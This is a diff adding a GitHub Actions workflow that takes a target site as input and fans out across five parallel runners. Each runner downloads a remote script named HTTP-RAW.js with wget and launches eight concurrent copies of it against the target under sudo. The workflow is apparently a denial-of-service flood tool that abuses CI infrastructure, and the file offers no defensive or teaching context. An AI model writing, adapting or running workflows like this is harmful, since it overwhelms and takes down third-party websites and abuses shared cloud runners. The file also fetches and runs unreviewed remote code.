@@ -1,0 +1,43 @@
+name: RAW !
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Site !"
+        required: true
+        default: "http://127.0.0.1/"
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      matrix:
+        instance: [1,2,3,4,5]
+
+    steps:
+      - name: Checkout (optional)
+        uses: actions/checkout@v4
+
+      - name: OK !
+        run: |
+          TARGET="${{ inputs.target }}"
+
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/HTTP-RAW.js -O RAW.js
+          chmod +x RAW.js || true
+
+          PIDS=()
+          for i in {1..8}; do
+            sudo timeout 45 node RAW.js "$TARGET" 45 &
+            PIDS+=($!)
+          done
+
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: Finish !
+        run: |
+          sleep 45
+          exit 0
